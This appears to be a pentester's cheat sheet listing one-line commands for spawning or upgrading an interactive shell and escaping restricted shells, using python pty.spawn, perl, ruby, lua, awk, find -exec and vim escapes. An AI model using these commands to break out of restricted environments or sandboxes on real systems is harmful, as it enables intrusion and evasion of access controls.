- /bin/sh -i
- python -c 'import pty; pty.spawn("/bin/bash")'
- python2 -c 'import pty; pty.spawn("/bin/bash")'
- python3 -c 'import pty; pty.spawn("/bin/bash")'
- perl -e 'exec "/bin/sh";'
- ruby: exec "/bin/sh"
- lua: os.execute('/bin/sh')
- awk 'BEGIN {system("/bin/sh")}'
- find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
- find . -exec /bin/sh \; -quit
- vim -c ':!/bin/sh'


```
vim
:set shell=/bin/sh
:shell
```
